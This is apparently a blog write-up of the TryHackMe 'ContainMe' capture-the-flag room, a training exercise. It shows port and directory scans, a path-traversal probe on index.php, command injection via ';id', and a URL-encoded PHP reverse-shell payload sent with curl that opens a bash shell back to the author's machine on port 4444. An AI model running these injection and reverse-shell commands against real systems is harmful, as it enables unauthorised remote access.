---
title: "TryHackMe: ContainMe"
author: cilgin
date: 2025-07-03 14:37:11 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-03-TryHackMe-ContainMe/main.png
---

Hi I'm making [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) room.

---


```bash
export IP=10.10.137.113
```


```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-03 14:43 +0300
Nmap scan report for 10.10.137.113
Host is up (0.068s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:39:87:29:ec:9f:b3:b7:3d:22:ef:67:f9:70:ca:ef (RSA)
|   256 4e:9e:59:79:eb:7a:32:95:f6:17:3b:d5:12:0f:9d:9f (ECDSA)
|_  256 ce:ba:ad:71:65:a1:de:13:47:11:30:a9:bf:23:e5:a9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 712.36 seconds
```


Firstly lets try fuyzzing the webserver using `gobuster`. 



```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30 
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.137.113/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              md,js,html,php,py,css,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68944]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

I used -t `30` beacuse i was geting some timeouts.

```bash
❯ curl $IP/index.php                    
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

I think we can use index.php to make path traversal

```bash
❯ curl 'http://10.10.137.113/index.php?path=../../../../../../../../etc/passwd'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

We can't read the files though. But maybe we can inject one more command using `;` lets try that.

```bash
❯ curl 'http://10.10.137.113/index.php?path=../../../../../../../../etc/passwd;id'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
uid=33(www-data) gid=33(www-data) groups=33(www-data)
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

And as you can see we have remote code execution. We can use that vuln to get reverse shell.

Let use [Online - Reverse Shell Generator](https://www.revshells.com/) to make a php reverse shell.

```bash
curl 'http://10.10.137.113/index.php?path=../../../../../../../../etc/passwd;php%20-r%20%27%24sock%3Dfsockopen%28%2210.21.206.128%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
```

And now we got a reverse shell.




